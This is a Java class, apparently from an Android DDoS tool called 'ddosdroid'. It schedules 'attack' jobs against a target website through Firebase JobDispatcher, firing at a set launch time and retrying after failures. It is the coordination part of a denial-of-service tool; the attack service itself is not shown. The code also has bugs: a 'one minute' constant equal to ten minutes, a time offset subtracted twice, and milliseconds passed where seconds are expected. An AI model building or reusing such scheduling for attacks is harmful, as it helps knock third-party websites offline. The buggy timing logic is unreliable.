package gr.kalymnos.sk3m3l10.ddosdroid.mvc_model.job;

import android.content.Context;
import android.os.Bundle;
import android.support.annotation.NonNull;
import android.util.Log;

import com.firebase.jobdispatcher.FirebaseJobDispatcher;
import com.firebase.jobdispatcher.GooglePlayDriver;
import com.firebase.jobdispatcher.Job;
import com.firebase.jobdispatcher.Lifetime;
import com.firebase.jobdispatcher.RetryStrategy;
import com.firebase.jobdispatcher.Trigger;

import java.util.concurrent.TimeUnit;

import gr.kalymnos.sk3m3l10.ddosdroid.constants.Extras;
import gr.kalymnos.sk3m3l10.ddosdroid.pojos.attack.Attack;

public final class AttackJobScheduler {
    private static final String TAG = "AttackJobScheduler";
    private static final long ONE_MINUTE_IN_MILLI = TimeUnit.MINUTES.toMillis(10);

    private FirebaseJobDispatcher dispatcher;

    public AttackJobScheduler(Context context) {
        this.dispatcher = new FirebaseJobDispatcher(new GooglePlayDriver(context));
    }

    public void schedule(Attack attack) {
        int windowOpen = 0;
        int windowEnd = 0;
        long currentTime = System.currentTimeMillis();
        long launchTime = attack.getLaunchTimestamp() - currentTime;
        if (launchTime - currentTime >= 0) {
            windowOpen = (int) launchTime;
            windowEnd = (int) (launchTime + ONE_MINUTE_IN_MILLI);
        }
        Job attackJob = jobFrom(attack, windowOpen, windowEnd);
        dispatcher.mustSchedule(attackJob);
    }

    @NonNull
    private Job jobFrom(Attack attack, int windowStart, int windowEnd) {
        Bundle bundle = new Bundle();
        bundle.putString(Extras.EXTRA_WEBSITE, attack.getWebsite());
        return dispatcher.newJobBuilder()
                .setService(AttackJobService.class)
                .setTag(attack.getPushId())
                .setRecurring(false)
                .setLifetime(Lifetime.UNTIL_NEXT_BOOT)
                .setTrigger(Trigger.executionWindow(windowStart, windowEnd))
                .setReplaceCurrent(false)
                .setRetryStrategy(RetryStrategy.DEFAULT_EXPONENTIAL)
                .setExtras(bundle)
                .build();
    }

    public void cancel(String jobTag) {
        dispatcher.cancel(jobTag);
        Log.d(TAG, "Job: " + jobTag + " canceled");
    }

    public void cancelAll() {
        dispatcher.cancelAll();
        Log.d(TAG, "Canceled all jobs");
    }

}
